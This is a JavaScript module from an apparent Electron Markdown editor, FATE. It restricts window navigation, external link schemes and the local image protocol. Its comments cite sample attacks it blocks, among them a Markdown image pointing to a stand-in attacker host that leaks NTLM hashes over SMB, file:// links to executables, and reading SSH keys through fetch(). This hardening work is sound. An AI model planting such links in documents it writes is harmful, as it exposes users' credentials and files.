'use strict';
/**
 * linkSecurity.cjs: which URLs FATE's windows may navigate to, which links FATE hands to the
 * operating system, and which files the fate-local:// image protocol may serve.
 *
 * All three answer the same question: a Markdown document is untrusted input, so what may a link
 * or an image in one make the app do? Free of Electron imports; test/linkSecurity.test.cjs runs it
 * under plain node, Windows-style paths included (every function takes the platform explicitly).
 */

const path = require('path');

/* ════════════════════════════════════════════════════════════════════════════════════════════
   NAVIGATION
   ════════════════════════════════════════════════════════════════════════════════════════════ */

/**
 * May a window navigate to `rawUrl`? Only to the one document it was opened on.
 *
 * `allowed` is `{ devServerUrl }` (dev: anything on the Vite server's origin, so its full-page
 * reloads keep working) or `{ entryUrl }` (the exact file URL, ignoring a #hash).
 *
 * Up to 1.13.4 the main window allowed anything under the `dist/` folder's URL. A relative link in
 * a document, `[Contributing](CONTRIBUTING.md)`, resolves against the PAGE, not the document, so it
 * became `…/dist/CONTRIBUTING.md`: inside the prefix, allowed, and the whole app was replaced by
 * an ERR_FILE_NOT_FOUND page with every tab and unsaved edit gone.
 *
 * File URLs are compared by host and decoded path rather than as strings, so the percent-encoding
 * Chromium chooses for a navigation (an install path with spaces or accents) cannot make the app's
 * own URL look foreign; on Windows, case-insensitively, like the file system.
 */
function isAllowedNavigation(rawUrl, allowed, platform = process.platform) {
  const target = parseUrl(rawUrl);
  if (!target) return false;
  if (allowed.devServerUrl) {
    const dev = parseUrl(allowed.devServerUrl);
    return !!dev && target.origin === dev.origin;
  }
  const entry = parseUrl(allowed.entryUrl);
  if (!entry || target.protocol !== 'file:' || entry.protocol !== 'file:') return false;
  if (target.search !== entry.search) return false; // `index.html?…` is a different document
  const key = fileUrlKey(target, platform);
  return key !== null && key === fileUrlKey(entry, platform);
}

/** Comparable identity of a file URL: host (UNC installs have one) plus the decoded path. */
function fileUrlKey(url, platform) {
  let decoded;
  try {
    decoded = decodeURIComponent(url.pathname);
  } catch {
    return null;
  }
  const key = `${url.hostname}|${decoded}`;
  return platform === 'win32' ? key.replace(/\\/g, '/').toLowerCase() : key;
}

function parseUrl(raw) {
  if (typeof raw !== 'string') return null;
  try {
    return new URL(raw);
  } catch {
    return null;
  }
}

/* ════════════════════════════════════════════════════════════════════════════════════════════
   EXTERNAL LINKS
   ════════════════════════════════════════════════════════════════════════════════════════════ */

/** Longer than any real link; refuses pathological input before it reaches a dialog or the OS. */
const MAX_EXTERNAL_URL_LENGTH = 8192;

/**
 * How a link may leave FATE: `{ kind: 'web', url }` for http(s), which the caller opens only
 * after the user confirms; `{ kind: 'mailto', url }`, opened directly because all it can do is
 * open a compose window; or null, refused.
 *
 * Refused on purpose: `file:` (the OS would OPEN or RUN the target: a document can link to
 * `file:///C:/Users/me/Downloads/setup.exe`), `javascript:`/`data:`/`blob:` (meaningless outside
 * the page), and every other scheme, because custom schemes (`ms-settings:`, `steam://`,
 * `vscode://`, `search-ms:`) launch other applications with arguments the document chose.
 *
 * `url` is the parser's canonical form, so whitespace or control characters around the input
 * never reach the confirmation dialog or `shell.openExternal`.
 */
function classifyExternalUrl(rawUrl) {
  if (typeof rawUrl !== 'string' || rawUrl.length > MAX_EXTERNAL_URL_LENGTH) return null;
  const url = parseUrl(rawUrl);
  if (!url) return null;
  if (url.protocol === 'http:' || url.protocol === 'https:') {
    return url.hostname ? { kind: 'web', url: url.href } : null;
  }
  if (url.protocol === 'mailto:') return { kind: 'mailto', url: url.href };
  return null;
}

/* ════════════════════════════════════════════════════════════════════════════════════════════
   LOCAL IMAGES (fate-local://)
   ════════════════════════════════════════════════════════════════════════════════════════════ */

/** What the preview may load through fate-local: images, and nothing a page script could read. */
const LOCAL_IMAGE_EXTENSIONS = new Set(['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'bmp', 'ico', 'avif', 'apng']);

/** Windows device names: `C:\x\COM1.png` opens the serial port, not a file, whatever the extension. */
const WINDOWS_DEVICE_NAME = /^(con|prn|aux|nul|com[0-9¹²³]|lpt[0-9¹²³]|conin\$|conout\$)$/i;

/**
 * Map a fate-local:// request to the file it may serve: `{ ok: true, filePath }`, or
 * `{ ok: false, status, reason }` for the handler to answer with.
 *
 * URL shape (built in src/markdown.js): `fate-local://local/<per-segment-encoded absolute path>`,
 * `/C%3A/Users/…` on Windows and `/home/…` elsewhere. Refused:
 *
 *  - NETWORK PATHS. `![](//attacker.example/share/x.png)` used to become a fate-local URL for
 *    `//attacker.example/share/x.png`, and fetching that on Windows opens an SMB connection that
 *    hands the user's NTLM hash to the attacker's machine. Merely opening the document was enough.
 *    Any path starting with two slashes of either kind is refused before anything touches the
 *    file system, and on Windows so is any path whose root is a UNC or device root (`\\server\`,
 *    `\\?\`, `\\.\`), which also catches mixed spellings like `/\server/share`.
 *  - RELATIVE PATHS. The renderer only ever sends absolute ones; on Windows that means a drive
 *    letter (`\x.png` would resolve against whatever the current drive is).
 *  - ANYTHING NOT AN IMAGE. The handler used to serve every local file to anything in the page,
 *    `fetch()` included, so one sanitiser bypass could read `~/.ssh/id_rsa`. Now it serves images
 *    by extension only (and the scheme no longer supports the Fetch API at all).
 */
function resolveLocalImagePath(rawUrl, platform = process.platform) {
  const refuse = (status, reason) => ({ ok: false, status, reason });
  const url = parseUrl(rawUrl);
  if (!url || url.protocol !== 'fate-local:' || url.hostname !== 'local') return refuse(400, 'Bad fate-local URL');

  let filePath;
  try {
    filePath = decodeURIComponent(url.pathname);
  } catch {
    return refuse(400, 'Bad fate-local URL');
  }
  if (filePath.includes('\0')) return refuse(400, 'Bad fate-local URL');

  // '/C:/Users/…' → 'C:/Users/…'. POSIX paths keep their leading slash.
  if (platform === 'win32' && /^\/[a-zA-Z]:/.test(filePath)) filePath = filePath.slice(1);
  if (/^[\\/]{2}/.test(filePath)) return refuse(403, 'Network paths are not served');

  const p = platform === 'win32' ? path.win32 : path.posix;
  if (platform === 'win32') {
    filePath = p.normalize(filePath.replace(/\//g, '\\'));
    if (p.parse(filePath).root.startsWith('\\\\')) return refuse(403, 'Network paths are not served');
    if (!/^[a-zA-Z]:\\/.test(filePath)) return refuse(403, 'Only absolute paths are served');
  } else {
    if (!p.isAbsolute(filePath)) return refuse(403, 'Only absolute paths are served');
    filePath = p.normalize(filePath);
  }

  // extname ignores a trailing separator, so `x.png/` (a folder, or nothing) would pass it.
  const ext = /[\\/]$/.test(filePath) ? '' : p.extname(filePath).slice(1).toLowerCase();
  if (!LOCAL_IMAGE_EXTENSIONS.has(ext)) return refuse(403, 'Only images are served');
  // Windows matches device names on the part before the FIRST dot, trailing spaces ignored.
  if (platform === 'win32' && WINDOWS_DEVICE_NAME.test(p.basename(filePath).split('.')[0].replace(/ +$/, ''))) {
    return refuse(403, 'Only images are served');
  }
  return { ok: true, filePath };
}

module.exports = {
  isAllowedNavigation,
  classifyExternalUrl,
  resolveLocalImagePath,
  LOCAL_IMAGE_EXTENSIONS,
  MAX_EXTERNAL_URL_LENGTH
};
